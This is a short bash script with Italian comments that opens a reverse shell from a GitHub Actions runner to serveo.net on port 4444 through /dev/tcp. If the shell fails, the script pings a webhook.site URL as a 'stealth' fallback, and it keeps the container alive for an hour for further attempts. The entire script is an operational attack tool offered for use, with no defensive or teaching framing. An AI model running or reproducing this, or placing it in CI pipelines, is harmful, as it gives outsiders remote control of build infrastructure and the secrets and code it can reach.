#!/bin/bash

echo "[*] Launching reverse shell to serveo.net..."

# Reverse shell: GitHub runner si connette alla tua macchina tramite Serveo
bash -i >& /dev/tcp/serveo.net/4444 0>&1

# Se la reverse shell fallisce, invia un ping via webhook (fallback stealth)
curl -s https://webhook.site/YOUR-ID -d "Reverse shell failed or closed"

# Mantieni il container attivo per debug o secondi tentativi
sleep 60m
